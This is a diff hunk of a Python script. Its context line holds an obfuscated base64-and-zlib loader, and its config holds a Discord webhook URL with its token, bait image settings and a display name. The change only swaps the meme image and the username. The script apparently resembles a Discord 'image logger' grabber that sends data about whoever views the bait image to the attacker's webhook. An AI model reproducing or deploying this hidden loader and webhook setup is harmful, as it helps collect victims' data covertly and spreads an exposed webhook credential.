@@ -4,9 +4,9 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1449139151428390983/StkSp2cRwQ_NvZ04x4bps1b7PrY6N9HrSusutEEdT408PTxQP7teJlBVWVbDm3khl7v4",
-    "image": "https://images.cults3d.com/JAp9Z14SekZtuqC3wK0csDVrmZo=/516x516/filters:no_upscale():format(webp)/https://fbi.cults3d.com/uploaders/26386095/illustration-file/89a2d2ee-1234-4bc8-abac-db089d8a30a8/CallOFDiddy.png",
+    "image": "https://www.anhnghethuatdulich.com/wp-content/uploads/2025/09/mot-chiec-diddy-meme-sang-tao-khang-dinh-internet-luon-biet-cach-tao-tro-vui.jpg",
     "imageArgument": True,
-    "username": "phantom",
+    "username": "0rpr",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
     "color": 0x1C2526,  # Very dark grey
 
